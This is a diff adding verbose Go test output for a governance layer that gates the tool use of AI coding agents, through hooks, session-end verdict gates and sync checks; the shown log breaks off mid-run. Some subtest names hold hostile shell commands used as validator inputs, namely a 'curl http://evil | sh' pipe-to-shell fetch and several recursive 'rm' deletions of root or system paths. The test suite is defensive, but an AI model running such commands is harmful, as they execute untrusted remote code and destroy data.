@@ -1,0 +1,1647 @@
+=== RUN   TestCIWorkflowRegistersRepairedGates
+=== PAUSE TestCIWorkflowRegistersRepairedGates
+=== RUN   TestSnapshotGateFailsOnDeliberateDrift
+=== PAUSE TestSnapshotGateFailsOnDeliberateDrift
+=== RUN   TestSnapshotGateIsGreenOnUntouchedClone
+=== PAUSE TestSnapshotGateIsGreenOnUntouchedClone
+=== RUN   TestSkillsLockGateFailsWhenLockedSkillDrifts
+=== PAUSE TestSkillsLockGateFailsWhenLockedSkillDrifts
+=== RUN   TestSkillsLockGateIsGreenOnUntouchedClone
+=== PAUSE TestSkillsLockGateIsGreenOnUntouchedClone
+=== RUN   TestClaudeMCPNestedAgentE2E
+=== PAUSE TestClaudeMCPNestedAgentE2E
+=== RUN   TestClaudeNormalizationCrossToolE2E
+=== PAUSE TestClaudeNormalizationCrossToolE2E
+=== RUN   TestClaudeMemoryCompactionDirectiveE2E
+=== PAUSE TestClaudeMemoryCompactionDirectiveE2E
+=== RUN   TestClaudeGovernanceHookBlockingE2E
+=== PAUSE TestClaudeGovernanceHookBlockingE2E
+=== RUN   TestClaudeAutoReviewBlocksOnHardIssueE2E
+=== PAUSE TestClaudeAutoReviewBlocksOnHardIssueE2E
+=== RUN   TestClaudeCrossWaveSmokeE2E
+=== PAUSE TestClaudeCrossWaveSmokeE2E
+=== RUN   TestInstallRepairsPreexistingObsoleteCopilotGovernance
+=== PAUSE TestInstallRepairsPreexistingObsoleteCopilotGovernance
+=== RUN   TestUpgradeRepairsPreexistingObsoleteCopilotGovernance
+=== PAUSE TestUpgradeRepairsPreexistingObsoleteCopilotGovernance
+=== RUN   TestUpgradeCheckOnlyReportsObsoleteCopilotGovernance
+=== PAUSE TestUpgradeCheckOnlyReportsObsoleteCopilotGovernance
+=== RUN   TestRepoCopilotGovernanceAppliesItsOwnFix
+=== PAUSE TestRepoCopilotGovernanceAppliesItsOwnFix
+=== RUN   TestDurableMemoryCompactionSurvivesNonCollaborativeAgentE2E
+=== PAUSE TestDurableMemoryCompactionSurvivesNonCollaborativeAgentE2E
+=== RUN   TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing
+=== PAUSE TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing
+=== RUN   TestPreToolHookDispatchAllowsNonCodeFiles
+=== PAUSE TestPreToolHookDispatchAllowsNonCodeFiles
+=== RUN   TestPostToolHookDispatchBlocksGovernanceFileEdit
+=== PAUSE TestPostToolHookDispatchBlocksGovernanceFileEdit
+=== RUN   TestPostToolHookDispatchAllowsRegularFileEdit
+=== PAUSE TestPostToolHookDispatchAllowsRegularFileEdit
+=== RUN   TestToolHooksDispatchNativeApplyPatchPayload
+=== PAUSE TestToolHooksDispatchNativeApplyPatchPayload
+=== RUN   TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict
+=== PAUSE TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict
+=== RUN   TestSessionEndHookDispatchAllowsApprovedVerdict
+=== PAUSE TestSessionEndHookDispatchAllowsApprovedVerdict
+=== RUN   TestPreToolHookDecisionIsIdenticalAcrossAgents
+=== PAUSE TestPreToolHookDecisionIsIdenticalAcrossAgents
+=== RUN   TestPreToolHooksDelegateToCanonicalScript
+=== PAUSE TestPreToolHooksDelegateToCanonicalScript
+=== RUN   TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed
+=== PAUSE TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed
+=== RUN   TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets
+=== PAUSE TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed
+=== PAUSE TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed
+=== RUN   TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed
+=== PAUSE TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed
+=== PAUSE TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed
+=== RUN   TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed
+=== PAUSE TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginBlocksWhenSkillPrerequisiteMissing
+--- PASS: TestOpenCodeGovernancePluginBlocksWhenSkillPrerequisiteMissing (0.47s)
+=== RUN   TestOpenCodeGovernancePluginAllowsWhenPrerequisiteSatisfied
+--- PASS: TestOpenCodeGovernancePluginAllowsWhenPrerequisiteSatisfied (0.80s)
+=== RUN   TestOpenCodeGovernancePluginBlocksUnconfirmedPreloadLikeLegacyAgents
+--- PASS: TestOpenCodeGovernancePluginBlocksUnconfirmedPreloadLikeLegacyAgents (0.75s)
+=== RUN   TestOpenCodeGovernancePluginBlocksApplyPatchTextWhenPrerequisiteMissing
+--- PASS: TestOpenCodeGovernancePluginBlocksApplyPatchTextWhenPrerequisiteMissing (0.27s)
+=== RUN   TestOpenCodeGovernancePluginIgnoresNonMutatingTools
+--- PASS: TestOpenCodeGovernancePluginIgnoresNonMutatingTools (0.23s)
+=== RUN   TestOpenCodeGovernancePluginWarnsOnceForUnrecognizedTool
+--- PASS: TestOpenCodeGovernancePluginWarnsOnceForUnrecognizedTool (0.14s)
+=== RUN   TestOpenCodeGovernancePluginTimeoutIsDenial
+--- PASS: TestOpenCodeGovernancePluginTimeoutIsDenial (0.33s)
+=== RUN   TestOpenCodeGovernancePluginOrchestratedFailsClosedWithoutValidator
+--- PASS: TestOpenCodeGovernancePluginOrchestratedFailsClosedWithoutValidator (0.13s)
+=== RUN   TestOpenCodeGovernancePluginMemoizesByToolAndFiles
+--- PASS: TestOpenCodeGovernancePluginMemoizesByToolAndFiles (0.14s)
+=== RUN   TestOpenCodeGovernancePluginStatsValidatorOnceAcrossMultipleTools
+--- PASS: TestOpenCodeGovernancePluginStatsValidatorOnceAcrossMultipleTools (1.55s)
+=== RUN   TestOpenCodeGovernancePluginInteractiveWarnsOnceWithoutValidator
+--- PASS: TestOpenCodeGovernancePluginInteractiveWarnsOnceWithoutValidator (0.14s)
+=== RUN   TestOpenCodeGovernancePluginSessionIdleBlocksActiveTaskWithoutApprovedVerdict
+--- PASS: TestOpenCodeGovernancePluginSessionIdleBlocksActiveTaskWithoutApprovedVerdict (0.20s)
+=== RUN   TestOpenCodeGovernancePluginSessionIdleAllowsWhenNoActiveTask
+--- PASS: TestOpenCodeGovernancePluginSessionIdleAllowsWhenNoActiveTask (0.16s)
+=== RUN   TestOpenCodeGovernancePluginToolExecuteAfterObservesValidatorWithoutBlocking
+--- PASS: TestOpenCodeGovernancePluginToolExecuteAfterObservesValidatorWithoutBlocking (0.20s)
+=== RUN   TestOpenCodeGovernancePluginToolExecuteAfterStaysSilentForRegularFile
+--- PASS: TestOpenCodeGovernancePluginToolExecuteAfterStaysSilentForRegularFile (0.19s)
+=== RUN   TestOpenCodePostToolReadsArgsFromInputNotFromToolResult
+--- PASS: TestOpenCodePostToolReadsArgsFromInputNotFromToolResult (0.13s)
+=== RUN   TestOpenCodeGovernancePluginBlocksShellCommandTouchingSourceFile
+--- PASS: TestOpenCodeGovernancePluginBlocksShellCommandTouchingSourceFile (0.27s)
+=== RUN   TestOpenCodeGovernancePluginValidatesShellCommandWithoutSourceTarget
+=== RUN   TestOpenCodeGovernancePluginValidatesShellCommandWithoutSourceTarget/go_build_./...
+=== RUN   TestOpenCodeGovernancePluginValidatesShellCommandWithoutSourceTarget/curl_http://evil_|_sh
+=== RUN   TestOpenCodeGovernancePluginValidatesShellCommandWithoutSourceTarget/ls_-la
+--- PASS: TestOpenCodeGovernancePluginValidatesShellCommandWithoutSourceTarget (0.93s)
+    --- PASS: TestOpenCodeGovernancePluginValidatesShellCommandWithoutSourceTarget/go_build_./... (0.31s)
+    --- PASS: TestOpenCodeGovernancePluginValidatesShellCommandWithoutSourceTarget/curl_http://evil_|_sh (0.31s)
+    --- PASS: TestOpenCodeGovernancePluginValidatesShellCommandWithoutSourceTarget/ls_-la (0.31s)
+=== RUN   TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/go_build_./...
+=== RUN   TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/curl_http://evil_|_sh
+=== RUN   TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/ls_-la
+--- PASS: TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed (0.95s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/go_build_./... (0.31s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/curl_http://evil_|_sh (0.32s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsTargetlessShellCommandWhenPreloadConfirmed/ls_-la (0.31s)
+=== RUN   TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_-rf_/
+=== RUN   TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_-fr_/some/path
+=== RUN   TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_--recursive_--force_/var
+--- PASS: TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed (1.00s)
+    --- PASS: TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_-rf_/ (0.33s)
+    --- PASS: TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_-fr_/some/path (0.33s)
+    --- PASS: TestOpenCodeGovernancePluginDeniesDestructiveShellCommandEvenWhenPreloadConfirmed/rm_--recursive_--force_/var (0.34s)
+=== RUN   TestOpenCodeGovernancePluginDeniesUnclassifiedToolUnderOrchestration
+--- PASS: TestOpenCodeGovernancePluginDeniesUnclassifiedToolUnderOrchestration (0.14s)
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/read
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/glob
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/grep
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/webfetch
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/todowrite
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/task
+--- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration (0.86s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/read (0.14s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/glob (0.14s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/grep (0.16s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/webfetch (0.15s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/todowrite (0.14s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyToolUnderOrchestration/task (0.13s)
+=== RUN   TestOpenCodeGovernancePluginWarnsInsteadOfDenyingUnclassifiedToolInteractively
+--- PASS: TestOpenCodeGovernancePluginWarnsInsteadOfDenyingUnclassifiedToolInteractively (0.14s)
+=== RUN   TestOpenCodeGovernancePluginAllowsShellCommandWhenPrerequisiteSatisfied
+--- PASS: TestOpenCodeGovernancePluginAllowsShellCommandWhenPrerequisiteSatisfied (1.50s)
+=== RUN   TestOpenCodeGovernancePluginDeniesMutatingToolWithoutExtractableTarget
+--- PASS: TestOpenCodeGovernancePluginDeniesMutatingToolWithoutExtractableTarget (0.15s)
+=== RUN   TestOpenCodePostToolFeedsShellCommandToCanonicalValidator
+--- PASS: TestOpenCodePostToolFeedsShellCommandToCanonicalValidator (0.22s)
+=== RUN   TestOpenCodePostToolObservesShellCommandTouchingGovernanceSource
+--- PASS: TestOpenCodePostToolObservesShellCommandTouchingGovernanceSource (0.20s)
+=== RUN   TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed/git_commit_-m_x
+=== RUN   TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed/git_push_origin_main
+--- PASS: TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed (0.62s)
+    --- PASS: TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed/git_commit_-m_x (0.31s)
+    --- PASS: TestOpenCodeGovernancePluginBlocksUnsolicitedGitCommitAndPushEvenWhenPreloadConfirmed/git_push_origin_main (0.31s)
+=== RUN   TestOpenCodeGovernancePluginAllowsGitCommitWithBothEscapesConfirmed
+--- PASS: TestOpenCodeGovernancePluginAllowsGitCommitWithBothEscapesConfirmed (0.33s)
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_status
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_diff
+=== RUN   TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_log_--oneline_-5
+--- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed (0.96s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_status (0.32s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_diff (0.32s)
+    --- PASS: TestOpenCodeGovernancePluginAllowsReadOnlyGitCommandsWhenPreloadConfirmed/git_log_--oneline_-5 (0.33s)
+=== RUN   TestPreToolDecisionIsIdenticalAcrossAllFourAgents
+=== PAUSE TestPreToolDecisionIsIdenticalAcrossAllFourAgents
+=== RUN   TestSessionEndCliBlockingContractIsMeasuredNotAssumed
+=== PAUSE TestSessionEndCliBlockingContractIsMeasuredNotAssumed
+=== RUN   TestSessionEndRefusalSignalsAreNotUniformAcrossAgents
+=== PAUSE TestSessionEndRefusalSignalsAreNotUniformAcrossAgents
+=== RUN   TestClaudeSessionEndGateIsWiredToItsBlockingEvent
+=== PAUSE TestClaudeSessionEndGateIsWiredToItsBlockingEvent
+=== RUN   TestCodexSessionEndGateIsWiredToItsBlockingEvent
+=== PAUSE TestCodexSessionEndGateIsWiredToItsBlockingEvent
+=== RUN   TestCopilotSessionEndGateSignalsRefusalOnStdout
+=== PAUSE TestCopilotSessionEndGateSignalsRefusalOnStdout
+=== RUN   TestSessionEndAssumedBlockingExitCodeConstantIsGone
+=== PAUSE TestSessionEndAssumedBlockingExitCodeConstantIsGone
+=== RUN   TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict
+=== PAUSE TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved
+=== RUN   TestSessionEndGateBlocksApprovedWithRemarks
+--- PASS: TestSessionEndGateBlocksApprovedWithRemarks (0.12s)
+=== RUN   TestSessionEndGateDefaultModeKeepsStdoutEmpty
+=== PAUSE TestSessionEndGateDefaultModeKeepsStdoutEmpty
+=== RUN   TestSessionEndGateJSONModeEmitsBlockDecisionOnStdout
+=== PAUSE TestSessionEndGateJSONModeEmitsBlockDecisionOnStdout
+=== RUN   TestSessionEndGateJSONModeEmitsNoDecisionWhenApproved
+=== PAUSE TestSessionEndGateJSONModeEmitsNoDecisionWhenApproved
+=== RUN   TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict
+=== PAUSE TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict
+=== RUN   TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport
+=== PAUSE TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport
+=== RUN   TestClaudeToolHooksCoverShellTool
+=== PAUSE TestClaudeToolHooksCoverShellTool
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool
+=== PAUSE TestClaudeToolHooksCoverEveryMutatingTool
+=== RUN   TestCodexAndCopilotToolHooksDeclareNoMatcher
+=== PAUSE TestCodexAndCopilotToolHooksDeclareNoMatcher
+=== RUN   TestOpenCodePluginTreatsShellAsMutating
+=== PAUSE TestOpenCodePluginTreatsShellAsMutating
+=== RUN   TestSyncGatesAreGreenOnUntouchedClone
+=== PAUSE TestSyncGatesAreGreenOnUntouchedClone
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted
+=== RUN   TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror
+=== PAUSE TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror
+=== RUN   TestSkillsSyncGateAllowlistsNonSkillDirectories
+=== PAUSE TestSkillsSyncGateAllowlistsNonSkillDirectories
+=== RUN   TestCodexLegacyHooksJSONIsNotShipped
+=== PAUSE TestCodexLegacyHooksJSONIsNotShipped
+=== RUN   TestClaudeLocalOnlyHookStaysOutOfEmbeddedMirror
+=== PAUSE TestClaudeLocalOnlyHookStaysOutOfEmbeddedMirror
+=== RUN   TestSyncGatesFailWhenCanonicalDirectoryIsDeleted
+=== PAUSE TestSyncGatesFailWhenCanonicalDirectoryIsDeleted
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror
+=== RUN   TestNoOrphanValidatorTestSuites
+=== PAUSE TestNoOrphanValidatorTestSuites
+=== RUN   TestValidatorSuitesRunInCI
+=== PAUSE TestValidatorSuitesRunInCI
+=== RUN   TestPoliciesSyncGateFailsOnMirrorOnlyDeletion
+=== PAUSE TestPoliciesSyncGateFailsOnMirrorOnlyDeletion
+=== RUN   TestPoliciesSyncGateFailsOnMirrorOnlyEdit
+=== PAUSE TestPoliciesSyncGateFailsOnMirrorOnlyEdit
+=== RUN   TestPoliciesSyncGateFailsOnCanonicalOnlyEdit
+=== PAUSE TestPoliciesSyncGateFailsOnCanonicalOnlyEdit
+=== RUN   TestClaudeRulesMirrorMatchesPreMigrationBaseline
+=== PAUSE TestClaudeRulesMirrorMatchesPreMigrationBaseline
+=== RUN   TestPortability_GenerateGovernance
+=== RUN   TestPortability_GenerateGovernance/go-monolith
+=== RUN   TestPortability_GenerateGovernance/node-api
+=== RUN   TestPortability_GenerateGovernance/polyglot-monorepo
+--- PASS: TestPortability_GenerateGovernance (2.80s)
+    --- PASS: TestPortability_GenerateGovernance/go-monolith (0.79s)
+    --- PASS: TestPortability_GenerateGovernance/node-api (0.96s)
+    --- PASS: TestPortability_GenerateGovernance/polyglot-monorepo (1.05s)
+=== RUN   TestPortability_ResolveReferencesSurgical
+=== RUN   TestPortability_ResolveReferencesSurgical/go_config.yaml_carrega_so_always
+=== RUN   TestPortability_ResolveReferencesSurgical/go_repository_sql_carrega_persistence
+=== RUN   TestPortability_ResolveReferencesSurgical/node_test_file_carrega_examples-testing
+=== RUN   TestPortability_ResolveReferencesSurgical/dotnet_DbContext_carrega_persistence
+--- PASS: TestPortability_ResolveReferencesSurgical (1.24s)
+    --- PASS: TestPortability_ResolveReferencesSurgical/go_config.yaml_carrega_so_always (0.20s)
+    --- PASS: TestPortability_ResolveReferencesSurgical/go_repository_sql_carrega_persistence (0.39s)
+    --- PASS: TestPortability_ResolveReferencesSurgical/node_test_file_carrega_examples-testing (0.31s)
+    --- PASS: TestPortability_ResolveReferencesSurgical/dotnet_DbContext_carrega_persistence (0.34s)
+=== RUN   TestPortability_PrerequisitesBlocksMissingSkill
+--- PASS: TestPortability_PrerequisitesBlocksMissingSkill (0.02s)
+=== RUN   TestPortability_HookGateCrossCLI
+=== RUN   TestPortability_HookGateCrossCLI/claude-go-ok
+=== RUN   TestPortability_HookGateCrossCLI/codex-go-ok
+=== RUN   TestPortability_HookGateCrossCLI/codex-apply-patch-go-ok
+=== RUN   TestPortability_HookGateCrossCLI/copilot-go-ok
+=== RUN   TestPortability_HookGateCrossCLI/claude-py-ok
+=== RUN   TestPortability_HookGateCrossCLI/codex-py-ok
+=== RUN   TestPortability_HookGateCrossCLI/claude-md-silent
+=== RUN   TestPortability_HookGateCrossCLI/copilot-md-silent
+--- PASS: TestPortability_HookGateCrossCLI (4.60s)
+    --- PASS: TestPortability_HookGateCrossCLI/claude-go-ok (0.60s)
+    --- PASS: TestPortability_HookGateCrossCLI/codex-go-ok (0.59s)
+    --- PASS: TestPortability_HookGateCrossCLI/codex-apply-patch-go-ok (0.60s)
+    --- PASS: TestPortability_HookGateCrossCLI/copilot-go-ok (0.58s)
+    --- PASS: TestPortability_HookGateCrossCLI/claude-py-ok (0.63s)
+    --- PASS: TestPortability_HookGateCrossCLI/codex-py-ok (0.95s)
+    --- PASS: TestPortability_HookGateCrossCLI/claude-md-silent (0.20s)
+    --- PASS: TestPortability_HookGateCrossCLI/copilot-md-silent (0.31s)
+=== RUN   TestPortability_HookBlocksWhenSkillsMissing
+=== RUN   TestPortability_HookBlocksWhenSkillsMissing/claude
+=== RUN   TestPortability_HookBlocksWhenSkillsMissing/codex
+=== RUN   TestPortability_HookBlocksWhenSkillsMissing/copilot
+--- PASS: TestPortability_HookBlocksWhenSkillsMissing (0.54s)
+    --- PASS: TestPortability_HookBlocksWhenSkillsMissing/claude (0.13s)
+    --- PASS: TestPortability_HookBlocksWhenSkillsMissing/codex (0.13s)
+    --- PASS: TestPortability_HookBlocksWhenSkillsMissing/copilot (0.27s)
+=== RUN   TestPortability_EconomyZeroRefsOnConfigEdit
+--- PASS: TestPortability_EconomyZeroRefsOnConfigEdit (0.26s)
+=== CONT  TestCIWorkflowRegistersRepairedGates
+=== CONT  TestSessionEndCliBlockingContractIsMeasuredNotAssumed
+=== CONT  TestOpenCodePluginTreatsShellAsMutating
+=== CONT  TestSessionEndGateDefaultModeKeepsStdoutEmpty
+=== RUN   TestSessionEndCliBlockingContractIsMeasuredNotAssumed/claude
+=== CONT  TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport
+=== RUN   TestSessionEndCliBlockingContractIsMeasuredNotAssumed/codex
+=== CONT  TestCodexAndCopilotToolHooksDeclareNoMatcher
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/pending
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/pending
+=== CONT  TestClaudeToolHooksCoverEveryMutatingTool
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/done-approved
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/done-approved
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/approved
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/approved
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/pending
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/pending
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/done-approved
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/done-approved
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/approved
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/approved
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/pending
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/pending
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/done-approved
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/done-approved
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/approved
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/approved
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/pending
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/pending
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/done-approved
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/done-approved
+=== RUN   TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/diff-reviewed_block_approved
+=== PAUSE TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/diff-reviewed_block_approved
+=== RUN   TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/diff-reviewed_block_with_remarks
+=== PAUSE TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/diff-reviewed_block_with_remarks
+=== RUN   TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_approved
+=== PAUSE TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_approved
+=== RUN   TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_with_remarks
+=== PAUSE TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_with_remarks
+=== RUN   TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_rejected
+=== PAUSE TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_rejected
+--- PASS: TestCIWorkflowRegistersRepairedGates (0.00s)
+=== CONT  TestSessionEndAssumedBlockingExitCodeConstantIsGone
+=== RUN   TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/approved
+=== PAUSE TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/approved
+=== CONT  TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict
+=== RUN   TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/claude
+=== PAUSE TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/claude
+=== RUN   TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/codex
+=== PAUSE TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/codex
+=== RUN   TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/copilot
+=== PAUSE TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/copilot
+=== RUN   TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/opencode
+=== PAUSE TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/opencode
+=== CONT  TestCopilotSessionEndGateSignalsRefusalOnStdout
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+=== RUN   TestSessionEndCliBlockingContractIsMeasuredNotAssumed/copilot
+--- PASS: TestSessionEndAssumedBlockingExitCodeConstantIsGone (0.00s)
+=== CONT  TestClaudeSessionEndGateIsWiredToItsBlockingEvent
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+=== RUN   TestSessionEndCliBlockingContractIsMeasuredNotAssumed/opencode
+--- PASS: TestSessionEndCliBlockingContractIsMeasuredNotAssumed (0.00s)
+    --- PASS: TestSessionEndCliBlockingContractIsMeasuredNotAssumed/claude (0.00s)
+    --- PASS: TestSessionEndCliBlockingContractIsMeasuredNotAssumed/codex (0.00s)
+    --- PASS: TestSessionEndCliBlockingContractIsMeasuredNotAssumed/copilot (0.00s)
+    --- PASS: TestSessionEndCliBlockingContractIsMeasuredNotAssumed/opencode (0.00s)
+=== CONT  TestSessionEndRefusalSignalsAreNotUniformAcrossAgents
+--- PASS: TestSessionEndRefusalSignalsAreNotUniformAcrossAgents (0.00s)
+=== CONT  TestCodexSessionEndGateIsWiredToItsBlockingEvent
+=== CONT  TestClaudeToolHooksCoverShellTool
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestOpenCodePluginTreatsShellAsMutating (0.00s)
+=== CONT  TestSessionEndGateJSONModeEmitsNoDecisionWhenApproved
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestSessionEndGateDefaultModeKeepsStdoutEmpty (0.15s)
+=== CONT  TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict
+=== RUN   TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/copilot/no-report
